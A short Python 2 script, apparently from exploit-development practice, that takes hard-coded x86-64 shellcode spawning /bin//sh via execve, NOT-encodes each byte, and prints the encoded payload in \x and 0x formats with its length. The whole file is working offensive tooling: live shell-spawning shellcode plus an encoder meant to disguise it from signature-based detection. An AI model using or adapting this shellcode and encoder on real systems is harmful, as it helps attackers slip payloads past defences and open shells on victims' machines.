#!/usr/bin/python


# Place the shellcode to be 'NOT encoded' into the bellow 'shellcode' variable and the
# script will do the rest


shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05")

str1 = ""
str2 = ""


print "Encoding now ..."

for i in bytearray(shellcode):
	
	encode = ~i

	str1 += "\\x%02x" % (encode & 0xff)
	str2 += "0x%02x," % (encode & 0xff)


print "\n" + str1 + "\n"
print str2 + "\n"
print "Length of encoded shellcode: %d" % len(shellcode)
